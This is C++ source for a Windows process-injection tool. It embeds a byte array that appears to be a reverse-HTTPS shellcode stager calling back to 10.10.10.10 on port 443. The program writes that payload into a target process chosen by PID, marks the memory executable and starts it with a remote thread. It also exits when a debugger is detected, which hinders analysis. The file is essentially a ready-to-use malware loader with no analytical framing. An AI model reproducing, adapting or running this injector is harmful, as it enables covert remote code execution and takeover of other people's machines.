#include <cstdio>
#include <Windows.h>

int main(int argc, char* argv[]) {

	DWORD dwPID = 0;	//32 bit unsigned int 

	const UCHAR MY_Data[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x48,0x8b,0x52,0x18,0x56,0x48,0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x41,0x51,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0x0c,0x00,0x00,0x00,0x31,0x30,0x2e,0x31,0x30,0x2e,0x31,0x30,0x2e,0x31,0x30,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0xb1,0x00,0x00,0x00,0x2f,0x67,0x71,0x67,0x48,0x72,0x65,0x4d,0x61,0x6e,0x34,0x73,0x53,0x53,0x68,0x4e,0x49,0x64,0x77,0x49,0x31,0x53,0x67,0x7a,0x50,0x36,0x69,0x58,0x47,0x4f,0x67,0x50,0x6a,0x6c,0x52,0x70,0x35,0x59,0x45,0x74,0x6b,0x4b,0x6b,0x48,0x66,0x7a,0x39,0x67,0x39,0x73,0x34,0x41,0x39,0x41,0x70,0x46,0x41,0x31,0x53,0x74,0x64,0x46,0x34,0x5a,0x43,0x73,0x5a,0x6d,0x4e,0x41,0x79,0x37,0x59,0x38,0x63,0x76,0x38,0x31,0x4e,0x66,0x4c,0x44,0x54,0x63,0x79,0x76,0x4d,0x5a,0x58,0x71,0x4e,0x30,0x41,0x50,0x45,0x65,0x2d,0x39,0x53,0x74,0x4e,0x64,0x2d,0x55,0x55,0x7a,0x30,0x56,0x6a,0x56,0x73,0x66,0x53,0x66,0x48,0x55,0x73,0x65,0x66,0x33,0x57,0x51,0x68,0x52,0x36,0x4a,0x78,0x6c,0x34,0x39,0x78,0x42,0x6b,0x30,0x37,0x45,0x6d,0x38,0x4b,0x34,0x33,0x53,0x54,0x49,0x39,0x52,0x2d,0x77,0x6b,0x4d,0x68,0x51,0x6d,0x34,0x67,0x53,0x38,0x52,0x48,0x5a,0x51,0x2d,0x51,0x30,0x72,0x44,0x31,0x70,0x4b,0x5f,0x36,0x49,0x48,0x58,0x35,0x71,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x02,0x28,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xcc,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5 };
	
	SIZE_T szMY_Data = sizeof(MY_Data);


	//Ensure user supplied PID at the command line 
	if (argc < 2) {
		printf("[!] Usage: %s <PID>", argv[0]);
		return EXIT_FAILURE;
	}

	if (IsDebuggerPresent() != 0) {
		return EXIT_FAILURE;
	}

	dwPID = atoi(argv[1]); //Convert the user supplied pid to an int

	//Get handle to process baesd on user supplied PID
	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwPID);
	//if return value is NULL something went wrong and we could not get the handle 
	if (handle == NULL) {
		//Did the user give us a pid at a high privelege level
		if (GetLastError() == ERROR_ACCESS_DENIED) {
			printf("[!] Access Denied\n");
			return EXIT_FAILURE;
		}
		//Did the user give us a pid that does not exist
		else if (GetLastError() == ERROR_INVALID_PARAMETER) {
			printf("[!] PID Does not Exist\n");
			return EXIT_FAILURE;
		}
		else {
			//Everything went well and we got a handle to the specified process 
			printf("[!] Failed to GetHandle: 0x%p\n", GetLastError());
			return EXIT_FAILURE;
		}
	}
	else {
		printf("[+] Got Handle to the Process: 0x%p\n", handle);
	}

	LPVOID myAllocation = VirtualAllocEx(
		handle,						//Return back a handle to this process
		NULL,						//Let windows decide where to alloc the memory
		szMY_Data,					//Size of cString
		MEM_COMMIT | MEM_RESERVE,	//Commit and reserve in one step 
		PAGE_READWRITE);			//Memory Constant 
	
	//if NULL returned something didnt work 
	if (myAllocation == NULL) {
		if (GetLastError() == ERROR_ACCESS_DENIED) {
			printf("[!] Failed to write memory, Access Denied\n");
			if (handle) {
				printf("[+] Closing Handle to Process\n");
				CloseHandle(handle);
			}
		}
		else {
			printf("[!] Failed to allocate memory: 0x%p\n", GetLastError());
			if (handle) {
				printf("[+] Closing Handle to Process\n");
				CloseHandle(handle);
			}
		}
	}
	else {
		//Returns back the base address of allocated memory
		printf("[+] Alocated memory, base address: 0x%p\n", myAllocation);
	}

	//Now lets write our string to memory 
	//handle --> the handle to the process we want to inject into 
	//myAllocation --> the base address returned back by VritualAllocEx
	//&cString --> pointer to the thing we are writing 
	//nSize --> the size of the thing we are writing 
	//NULL --> dont care about this, can be ignored 
	BOOL writeMemory = WriteProcessMemory(handle, myAllocation, MY_Data, szMY_Data, NULL);
	if (writeMemory) {
		printf("[+] Successfully wrote data into target process\n");
	}
	else {
		printf("[!] Failed to write data into target process memory: 0x%p\n", GetLastError());

	}

	//change memory protections here 
	DWORD flOldProtect = 0;		//holds the old memory constant 

	BOOL changePerms = VirtualProtectEx(handle, myAllocation, szMY_Data, PAGE_EXECUTE, &flOldProtect);

	if (changePerms == 0) {
		printf("[!] Failed to change memory permissions: 0x%p\n", GetLastError);
	}
	else {
		printf("[+] Changed memory permisions to RX :)\n");
	}



	HANDLE cThread = CreateRemoteThreadEx(handle, NULL, 0, (LPTHREAD_START_ROUTINE)myAllocation, NULL, 0, NULL, NULL);
	if (cThread == NULL) {
		printf("[!] Could not create Thread in process: 0x%p\n", GetLastError());
		if (cThread) {
			printf("[+] Killing Injected Thread\n");
			CloseHandle(cThread);
		}
	}
	else {
		printf("[+] Created Thread in process, handle: 0x%p\n", cThread);
	}

	WaitForSingleObject(cThread, INFINITE);
	printf("[+] Thread finished execution\n");



}
